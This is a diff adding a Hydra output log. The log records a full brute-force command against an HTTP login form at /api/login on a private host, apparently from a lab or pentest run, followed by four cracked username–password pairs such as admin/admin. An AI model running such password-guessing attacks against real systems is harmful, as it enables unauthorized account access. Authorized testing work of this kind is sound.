@@ -1,0 +1,5 @@
+# Hydra v9.7 run at 2026-10-01 18:55:55 on 172.30.0.11 http-post-form (hydra -L /wordlists/users.txt -P /wordlists/passwords.txt -o /out/hydra_20261002T002551.txt -s 8080 -t 4 -V 172.30.0.11 http-post-form /api/login:username=^USER^&password=^PASS^:1=:F=error)
+[8080][http-post-form] host: 172.30.0.11   login: admin   password: admin
+[8080][http-post-form] host: 172.30.0.11   login: alice   password: sunshine
+[8080][http-post-form] host: 172.30.0.11   login: bob   password: letmein
+[8080][http-post-form] host: 172.30.0.11   login: carol   password: qwerty123
